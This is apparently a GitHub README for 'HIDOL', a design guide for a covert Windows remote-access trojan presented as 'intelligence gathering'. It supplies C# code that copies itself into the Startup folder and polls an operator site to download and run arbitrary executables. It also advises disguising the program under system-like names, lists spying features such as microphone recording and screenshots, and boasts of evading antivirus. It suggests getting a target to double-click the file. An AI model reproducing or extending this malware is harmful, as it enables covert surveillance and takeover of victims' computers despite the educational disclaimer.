<img src="https://raw.githubusercontent.com/RobinHannanJanssen/HIDOL/main/LOGO.png">
<h3>The High Doses Of Lemon Project</h3>Experimental intelligence gathering from devices compromised with HIDOL
<br>

# Disclaimer
- I, the creator, am in no way responsible for any actions that you may make using this information. 
- You take full responsibility for any action taken using this information. 
- Please take note that this document was designed for educational purposes and should never be used maliciously. 

# Introduction
Cyber threats are one of the biggest threats faced by National Security today. According to the October 2020 report of the Homeland Threat Assessment by the Department of Homeland Security, **Cyberattacks** remain the number one threat. Taken from <a href="https://www.dhs.gov/sites/default/files/publications/2020_10_06_homeland-threat-assessment.pdf" target="_blank">dhs.gov</a>:
> Cyber threats to the Homeland from both nation-states and non-state actors will remain acute. U.S. critical infrastructure faces advanced threats of disruptive or destructive cyber-attacks. Federal, state, local, tribal and territorial governments, as well as the private sector, will experience an array of cyber-enabled threats designed to access sensitive information, steal money, and force ransom payments.

In order, to combat Cyberattacks against a nation or country, an organization should have the ability to distinguish, imitate and ace the methods of present cyberattacks. 
> This is where intelligence comes in.

# How it works
Several variables contribute to how HIDOL functions properly. A combination of covert communications while maintaining stealth is the key to how HIDOL functions. Take a look at the function diagram below:

<img src="https://raw.githubusercontent.com/RobinHannanJanssen/HIDOL/main/architecture.png">

Contrary to what you think, HIDOL is not one single program. Like i said before, several variables contribute such as **covert communications**; we shall use Python as the programming language for the control panel, as Python is extremely useful and much easier when working with scraping. 

We shall have the Target application created using C#. C# is one of the best options when targeting Windows only programs, but Java or something else might do. The app should be named something unsuspicious like **Runtime Dllhost** or **webUtc**. There will be a timer with an interval of seconds to visit the referrer site and check for the latest instruction. The target app will make sure it is set to *Run on startup* without administrative rights. This is possible to do so using a simple copy:
```csharp
static void AddToStartup() {
    try {
    	string exe_path = Application.ExecutablePath;
    	string startup_path = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + System.AppDomain.CurrentDomain.FriendlyName;

        System.IO.File.Copy(exe_path, startup_path);
    }
    catch { }
}
```

Having a domain or DNS hosted is a must, as both the control panel and the target application depends on having a referrer in which communications and information posts takes place.

A normal conversation between the control panel, the referrer and the target app would need an instruction. The control panel (a.k.a you) edits a webpage (of DNS or domain) string. For example, you want the target app to download a file and run it. The comparison between the pseudo instruction and the string that the program would understand is:
- Pseudo instruction: `Download file from https://example.com/example.exe`
- String displayed on DNS: `DOWNLOAD https://example.com/example.exe`

When the target app makes the next web request, it will undergo a function like this:
```csharp
//make instruction to site and set contents to string
string instruction = Request({{YOUR_SITE}});

if (instruction.Contains("DOWNLOAD")) {
    //extract instruction from site
    string[] splitted = instruction.Split(' ');
    string url = splitted[1].ToString();

    //acknowledge file as .exe
    string path = Application.StartupPath + "\\" + "program.exe";

    //download the program
    WebClient Client = new WebClient();
    Client.DownloadFile(new Uri(url), path);

    //run file
    System.Diagnostics.Process.Start(path);
}
```

Up to this point, the downloaded program runs and captures information such as OS information and local IP address. The program then posts that information back to the DNS on a separate page, where it logs the info. The control panel would then login to that DNS or domain to gather the information which was stored. But we may also use SMTP using Gmail to send the info to your email.

# Usage
We can get very creative and add functions which will guarantee (almost) full control over the target computer. Such as the following:
- Record the device microphone for a given amount of time
- Take a screenshot of the target's computer
- Download a file and run it (e.g: .mp3, .exe)
- Run a CMD command (we would be able to find local files this way)
- Display message to the target device
- Run the browser to a specific URL
- Stay stationary/Stop any previous instruction

There is no doubt that a program with these capabilities would raise the suspicion of **Antivirus softwares**. According to <a href="https://www.virustotal.com/gui/file/005f6a68736937d2ed265a2dbee7123a72f5a47abfd2db24349d6c636c7d2439/detection">virustotal.com</a>, the target app had a **4** out of **72** suspicion rate (which is not bad).

# Deployment
- Since we are using C# as the target app language, we must ensure that the target device has a .NET framework installed. We shall use framework version 3.5 as according to <a href="https://docs.microsoft.com/en-us/dotnet/framework/migration-guide/versions-and-dependencies#net-framework-35">docs.microsoft.com</a>, version 3.5 is already included in Windows 10, 8.1, 8 and 7. So we can be sure that the target device has already satisfied this requirement.
- To get HIDOL to work, we need a target device to compromise with. This means finding a target who uses the computer. And somehow finding a way to get the target to double-click on the target app. Otherwise, you may have physical access to the computer, you can do it yourself. All it takes is a double-click.
- From that moment you double-clicked, the target app will remain indefinitely. We may want to add an `Uninstall` function, in case the target user finds out.
- Finally, we will be able to conduct our experiment on the target device.

# Pros and Cons
### Pros
- An alternative to information gathering using port forward
- Does not require administrative rights
- Able to conduct functions as a normal user
- (Almost) free from antivirus software
- Access to files, drivers, etc
- Being able to conduct stealth

### Cons
- Tough installation
- Delayed instruction during timer interval
- Not real-time information
- Unable to conduct multiple tasks at once

# Conclusion
There are multiple ways of gathering intelligence, for government agencies, this would be a much easier task. The intelligence community seeks to reduce uncertainty and provide warning about potential threats to its National security. Per the example above, we have used a fixed environment as an operating system, and we were able to exploit that environment even with its limitations. By adding these methods to the existing capabilities of cybersecurity, we're not only bolstering our security operations effectiveness, but we are also greatly improving the safety and protection against these techniques, in the cyber world.

# Credits
- [Robin Hannan Janssen](https://github.com/robinhannanjanssen) - Lead designer
